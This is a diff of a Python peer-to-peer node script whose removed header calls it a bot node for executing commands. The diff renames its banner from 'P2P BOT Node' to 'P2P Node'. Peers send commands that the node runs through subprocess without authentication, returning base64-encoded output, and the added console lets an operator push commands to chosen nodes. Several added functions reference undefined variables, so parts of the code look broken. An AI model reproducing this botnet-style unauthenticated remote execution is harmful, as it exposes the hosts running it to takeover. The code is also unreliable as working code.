@@ -1,23 +1,19 @@
 #!/usr/bin/env python3
 
-#####################################
-### BOT NODE - executing commands ###
-###          - no input           ### 
-#####################################
-#####################################
+import sys
+sys.path.append("/home/cheki/projects/python/p2p/app/inputthread")
 
-
+import os
 import threading
 import socket
 import inputthread
 import json
 import random
 import select
-import sys
+import queue
 import base64
 import errno
 import time
-import os
 import subprocess
 from dataclasses import dataclass
 
@@ -35,8 +31,8 @@ class Node:
         self._socket = {
             "id": str(random.randint(10000000, 99999999)),
             "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
-            "ip": ip,
-            "port": port,
+            "ip": str(ip),
+            "port": int(port),
             "type": "MASTER"
         }
         self._socket["socket"].setblocking(False)
@@ -175,7 +171,7 @@ class Node:
     #
     # accept incomming connection | append node to peer list | add socket to stream_input | send new peer list to input thread
     #
-    def handle_inc_connection(self, stream_in: list, c = _Const) -> int:
+    def handle_inc_connection(self, stream_in: list, q: queue.Queue, c = _Const) -> int:
         try:
             sock, addr = self._socket["socket"].accept()
             sock.setblocking(False)
@@ -203,6 +199,7 @@ class Node:
         })
 
         stream_in.append(sock)
+        q.put_nowait(self._tcp_connections)
 
         t = time.strftime(c.TIME_FORMAT, time.localtime())
         print(f"{t} :: new connection <<< {addr[0]}:{addr[1]}")
@@ -212,7 +209,7 @@ class Node:
     #
     # connect to all new peers in list | send new peer list to input thread
     #
-    def loop_connect_nodes(self, json_list: list) -> None:
+    def loop_connect_nodes(self, json_list: list, q: queue.Queue) -> None:
         for node in range(len(json_list)):
             already_connected = False
             # not connecting to self
@@ -226,12 +223,13 @@ class Node:
             if already_connected:
                 continue
             self.connect_to_node(json_list[node]["ip"], json_list[node]["port"])
+        q.put_nowait(self._tcp_connections)
 
 
     #
     # handle recv from stream_select
     #
-    def handle_connections(self, c: _Const) -> int:
+    def handle_connections(self, q: queue.Queue, c: _Const) -> int:
 
         stream_in = [ self._socket["socket"] ]
         select_timeout_sec = 3
@@ -253,26 +251,26 @@ class Node:
             for s in self._INPUT:
                 # new connection
                 if s == self._socket["socket"]:
-                    inc_conn_res = self.handle_inc_connection(stream_in, c=c)
+                    inc_conn_res = self.handle_inc_connection(stream_in, q=q, c=c)
                     if inc_conn_res != 0:
                         return inc_conn_res
                     continue
 
                 if self.is_socket_closed(s):
                     print(f"socket closed! removing..")
-                    self.close_socket(s=s, ssi=stream_in, c=c)
+                    self.close_socket(s=s, ssi=stream_in, q=q, c=c)
                     continue
 
                 try:
                     inc_data = s.recv(c.BUFFER_SIZE)
                 except socket.error as e:
                     print(f"socket error on recv(): {e.args[::-1]}")
-                    self.close_socket(s=s, ssi=stream_in, c=c)
+                    self.close_socket(s=s, ssi=stream_in, q=q, c=c)
                     continue
 
                 if not inc_data:
                     print("empty packet!")
-                    self.close_socket(s=s, ssi=stream_in, c=c)
+                    self.close_socket(s=s, ssi=stream_in, q=q, c=c)
                     continue
 
                 # if inc data is not empty => connection alive
@@ -288,7 +286,7 @@ class Node:
                 if json_list and not isinstance(json_list, int) and json_list[0].get("new_list") != None and json_list[0]["new_list"] == 1:
                     json_list.pop(0)
                     # connect to nodes in peer list
-                    self.loop_connect_nodes(json_list)
+                    self.loop_connect_nodes(json_list, q)
                     continue
 
                 if isinstance(inc_data, bytes):
@@ -296,13 +294,13 @@ class Node:
 
                 if inc_data:
                     if inc_data == "exit:":
-                        self.close_socket(s=s, ssi=stream_in, c=c)
+                        self.close_socket(s=s, ssi=stream_in, q=q, c=c)
                         break
                     elif inc_data[:7] == "inccmd:":
                         cmd = inc_data[7:]
                         print(f">>> incomming command sequence [{cmd}]")
                         # port is not needed as target is searched based upon same IP and "OUT" socket type => node socket pair
-                        self.exec_cmd(cmd=cmd, ip=ip, c=c)
+                        self.exec_cmd(cmd=cmd, ip=ip, q=q, c=c)
                         continue
                 
                     t = time.strftime(c.TIME_FORMAT, time.localtime())
@@ -314,7 +312,7 @@ class Node:
     #
     #
     #
-    def exec_cmd(self, cmd: str, ip: str, c: _Const) -> int:
+    def exec_cmd(self, cmd: str, ip: str, q: queue.Queue, c: _Const) -> int:
         target = {
             "node": self._tcp_connections[node] \
                     for node in range(len(self._tcp_connections)) \
@@ -343,17 +341,15 @@ class Node:
 
         try:
             ret = "\n-----\n".join([str(r) for r in returned_outputs])
-            b64ret = "inc-ret-cmd:".encode() + base64.b64encode(ret.encode())
-
+            b64ret = base64.b64encode(ret.encode())
             target["node"]["socket"].send(b64ret)
-            
         except socket.error as e:
             print(f"socket error on cmd-ret socket.send(): {e.args[::-1]}")
-            self.close_socket(s=target["node"]["socket"], ssi=[], c=c)
+            self.close_socket(s=target["node"]["socket"], ssi=[], q=q, c=c)
             return 1
         except Exception as e:
             print(f"unexpected error on cmd-ret socket.send(): {e.args[::-1]}")
-            self.close_socket(s=target["node"]["socket"], ssi=[], c=c)
+            self.close_socket(s=target["node"]["socket"], ssi=[], q=q, c=c)
             return 1
         
         print(f">>> command sequence executed and output sent back to node: {target['node']['ip']}:{target['node']['port']}")
@@ -361,10 +357,21 @@ class Node:
 
 
     #
+    # disconnect node by command
+    # TODO: also remove INC node
+    #
+    def dc_node(self, ip: str, port: int, q: queue.Queue, c: _Const) -> None:
+        for node in range(len(self._tcp_connections)):
+            if self._tcp_connections[node]["ip"] == ip and int(self._tcp_connections[node]["port"]) == port:
+                self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+                break
+
+
+    #
     # close socket | remove from lists | re-send new list to stream_in thread
     # ssi => stream-select-inputs list
     #
-    def close_socket(self, s: socket.socket, ssi: list, c: _Const) -> None:
+    def close_socket(self, s: socket.socket, ssi: list, q: queue.Queue, c: _Const) -> None:
         try:
             s.shutdown(socket.SHUT_RDWR)
         except socket.error as e:
@@ -377,15 +384,12 @@ class Node:
             ssi.remove(s)
         for node in range(len(self._tcp_connections)):
             if self._tcp_connections[node]["socket"] == s:
-
                 t = time.strftime(c.TIME_FORMAT, time.localtime())
                 socket_direction_type = ">>>" if self._tcp_connections[node]['type'] == "OUT" else "<<<"
-
-                print(f"{t} :: disconnected {socket_direction_type} \
-                {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}")
-
+                print(f"{t} :: disconnected {socket_direction_type} {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}")
                 del self._tcp_connections[node]
                 break
+        q.put_nowait(self._tcp_connections)
 
 
     #
@@ -407,6 +411,86 @@ class Node:
         print("disconnected all clients..\nmaster socket closed!")
 
 
+    #
+    # get connected clients
+    #
+    def conninfo(self) -> None:
+        for node in range(len(self._tcp_connections)):
+            print(f"{node} - {self._tcp_connections[node]['id']} - {self._tcp_connections[node]['type']} - {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}")
+
+
+    #
+    # send msg to single node
+    #
+    def send_to_node(self, ip: str, port: int, msg: bytes, c: _Const) -> int:
+        target = {
+            "node": self._tcp_connections[node] \
+                    for node in range(len(self._tcp_connections)) \
+                    if self._tcp_connections[node]["ip"] == ip and self._tcp_connections[node]["port"] == port
+        }
+        if not target:
+            print(f"target {ip}:{port} doesn't exist")
+            return 1
+        try:
+            target["node"]["socket"].send(msg)
+        except socket.error as e:
+            print(f"socket error on socket.send(): {e.args[::-1]}")
+            self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+            return 1
+        except Exception as e:
+            print(f"unexpected error on socket.send(): {e.args[::-1]}")
+            self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+            return 1
+        return 0
+
+
+    #
+    #
+    #
+    def broadcast_msg(self, msg: bytes, q: queue.Queue, c: _Const) -> int:
+        for node in range(len(self._tcp_connections)):
+            if self._tcp_connections[node]["socket"] == self._socket["socket"]: # not sending to self
+                continue
+            try:
+                self._tcp_connections[node]["socket"].send(msg)
+            except socket.error as e:
+                print(f"socket error on socket.send(): {e.args[::-1]}")
+                self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+                return 1
+            except Exception as e:
+                print(f"unexpected error on soocket.send(): {e.args[::-1]}")
+                self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+                return 1
+        return 0
+
+
+    #
+    #
+    #
+    def cmd_to_node(self, ip: str, port: int, cmd: bytes, c: _Const) -> int:
+        target = {
+            "node": self._tcp_connections[node] \
+                    for node in range(len(self._tcp_connections)) \
+                    if self._tcp_connections[node]["ip"] == ip and self._tcp_connections[node]["port"] == port
+        }
+        if not target:
+            print(f"target {ip}:{port} doesn't exist")
+            return 1
+        # send flag that packets are command
+        cmd_flag = "inccmd:".encode()
+        print(f">>> sending command [{cmd}] to node [{ip}:{port}]")
+        try:
+            target["node"]["socket"].send(cmd_flag + cmd)
+        except socket.error as e:
+            print(f"socket error on cmd socket.send(): {e.args[::-1]}")
+            self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+            return 1
+        except Exception as e:
+            print(f"unexpected error on cmd socket.send(): {e.args[::-1]}")
+            self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], q=q, c=c)
+            return 1
+        return 0 
+
 
 #
 #
@@ -422,6 +506,12 @@ def r_file(fpath: str) -> bytes:
         return b''
     return fcontents
 
+
+#
+#
+#
+def display_options() -> None:
+    print("| commands |\n> getopts:\n> conninfo:\n> sendfile:{file_path}\n> connnode:127.0.0.1:1111\n> sendtonode:127.0.0.1:1111|{\"message\"}\n> dcnode:127.0.0.1:1111\n> exit")
 
 
 #
@@ -440,6 +530,87 @@ def validate_ip_port(ip: str, port: int) -> int:
         return 1
     return 0
 
+
+# global callback for input-thread (broadcast/exec messages/commands)
+# inp  => input string | bytes
+# args => additional args to fnc
+def input_callback(inp, args) -> int:
+    # close node from input thread
+    def exit_from_cmd(node: Node) -> int:
+        node.close_master_socket()
+        node._EXIT_ON_CMD = True
+        return 1
+
+    node, c, q = (args["_node"], args["_const"], args["_queue"])
+
+    if not isinstance(node, Node) or not isinstance(c, _Const) or not isinstance(q, queue.Queue):
+        print("input-callback: invalid class instances.. exiting input thread..")
+        return 1
+    
+    # update input-thread tcp connections list
+    if not q.empty():
+        new_list = q.get_nowait()
+        node.set_connections(new_list)
+        q.task_done()
+
+    if not inp:
+        print("--- empty input..")
+        return 1
+
+    if inp[:9] == "sendfile:":
+        print("sending file..")
+        out = r_file(inp.split(":")[1])
+        # TODO: send & recv file as function
+
+    elif inp == "getopts:":
+        display_options()
+        return 0
+
+    elif inp == "conninfo:":
+        node.conninfo()
+        return 0
+
+    elif inp[:9] == "connnode:":
+        addr = inp[9:len(inp)].split(":")
+        if validate_ip_port(str(addr[0]), int(addr[1])) != 0:
+            return 1
+        node.connect_to_node(ip=str(addr[0]), port=int(addr[1]))
+        return 0
+
+    elif inp[:7] == "dcnode:":
+        addr = inp[7:len(inp)].split(":")
+        if validate_ip_port(str(addr[0]), int(addr[1])) != 0:
+            return 1
+        node.dc_node(ip=str(addr[0]), port=int(addr[1]), q=q, c=c)
+        return 0
+
+    elif inp[:11] == "sendtonode:":
+        addr = inp[11:inp.index("|", 11, len(inp))].split(":")
+        msg = inp[inp.index("|", 11, len(inp)):].lstrip("|")
+        if validate_ip_port(str(addr[0]), int(addr[1])) != 0:
+            return 1
+        node.send_to_node(ip=str(addr[0]), port=int(addr[1]), msg=msg.encode(), c=c)
+        return 0
+
+    elif inp[:10] == "cmdtonode:":
+        addr = inp[10:inp.index("|", 10, len(inp))].split(":")
+        cmd = inp[inp.index("|", 10, len(inp)):].lstrip("|")
+        if validate_ip_port(str(addr[0]), int(addr[1])) != 0:
+            return 1
+        node.cmd_to_node(ip=str(addr[0]), port=int(addr[1]), cmd=cmd.encode(), c=c)
+        return 0
+
+
+    elif inp == "exit:":
+        return exit_from_cmd(node)
+
+    else:
+        # default
+        out = inp.encode()
+
+    node.broadcast_msg(msg=out, q=q, c=c)
+
+    return 0
 
 
 #
@@ -470,8 +641,8 @@ def main():
 
     # no args
     else:
-        default_port = 45666
         ip_0, port_0 = (None, None)
+        default_port = 45666
 
         if _argc == 1:
             # assign default host ip & port
@@ -480,26 +651,37 @@ def main():
         else:
             print("invalid arguments")
             exit(1)
-
-
     
     n = Node(ip, port)
+    q = queue.Queue(20)
     c = _Const()
+
+    # init non-blocking input thr
+    inpthr = inputthread.InputThread(input_callback=input_callback, _node=n, _const=c, _queue=q)
+    # thread watcher
+    while 1:
+        if not inpthr.is_alive():
+            print("re-starting input-thread")
+            inpthr = None
+            inpthr = inputthread.InputThread(input_callback=input_callback, _node=n, _const=c, _queue=q)
+            break
+        else:
+            print("input-thread is alive.")
+            break
 
     # init node as tcp server
     if n.init_server(c) != 0:
         print("[!] failed to initialize node as server")
         exit(1)
 
-    print(f">>>\n>>> P2P BOT Node {ip}:{port}\n>>>")
+    print(f">>>\n>>> P2P Node {ip}:{port}\n>>>")
 
     # make initial connection
-    if ip_0 and port_0:
-        if validate_ip_port(ip_0, port_0) == 0:
-            print(f">>> connecting to node-0 [{ip_0}:{port_0}]")
-            n.connect_to_node(ip=ip_0, port=port_0)
+    if ip_0 and port_0 and validate_ip_port(ip_0, port_0) == 0:
+        print(f">>> connecting to node-0 [{ip_0}:{port_0}]")
+        n.connect_to_node(ip=ip_0, port=port_0)
 
-    ret = n.handle_connections(c)
+    ret = n.handle_connections(q, c)
 
     if ret == 0:
         print(f"exited normally with [{ret}]")
@@ -510,6 +692,7 @@ def main():
         print(f"exited with error [{ret}]")
     
     exit(ret)
+
 
 if __name__ == '__main__':
     main()
